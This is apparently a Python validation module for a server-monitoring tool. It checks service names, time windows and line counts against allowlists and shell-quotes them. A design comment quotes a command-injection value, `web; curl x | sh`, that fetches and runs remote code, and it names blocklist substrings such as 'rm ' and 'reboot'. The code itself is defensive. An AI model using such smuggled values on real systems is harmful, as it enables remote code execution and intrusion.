"""Argument validation for the vps-monitor tools.

Kept in its own module so the rules can be tested without a config file, an
SSH key, or the mcp package installed.
"""

import re
import shlex

# Why an allowlist and not a blocklist:
#
# An earlier version of this file screened commands against a blocklist of
# dangerous substrings ("rm ", "reboot", ...). That was not a control: every
# tool argument was interpolated into a string that a remote shell then
# executed, so a service name like `web; curl x | sh` ran, and the blocklist
# never saw a pattern it knew. Blocklists enumerate what you thought of.
#
# Arguments are now validated against an allowlist of shapes and quoted with
# shlex.quote before they reach the shell. See tests/test_command_safety.py.

SERVICE_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9_.-]{0,63}$")
SINCE_RE = re.compile(r"^(\d{1,4}[smhdw]|\d{4}-\d{2}-\d{2}(T[\d:]{5,8}Z?)?)$")


class InvalidArgument(ValueError):
    """Raised when a tool argument does not match its allowed shape."""


def valid_service(service: str) -> str:
    """Return the service name, quoted, or explain why it was refused."""
    if not SERVICE_RE.match(service):
        raise InvalidArgument(
            f"{service!r} is not a valid container name. Expected letters, digits, "
            "dot, dash or underscore, up to 64 characters."
        )
    return shlex.quote(service)


def valid_since(since: str) -> str:
    """Return a Docker --since value, quoted, or explain why it was refused."""
    if not SINCE_RE.match(since):
        raise InvalidArgument(
            f"{since!r} is not a valid time window. Expected a duration such as "
            "'30m', '12h' or '7d', or a date such as '2026-08-20'."
        )
    return shlex.quote(since)


def valid_lines(lines: int) -> str:
    """Return a bounded tail length. Guards against a negative or absurd value."""
    if not isinstance(lines, int) or not 1 <= lines <= 5000:
        raise InvalidArgument(f"{lines!r} is out of range. Expected 1 to 5000 lines.")
    return str(lines)

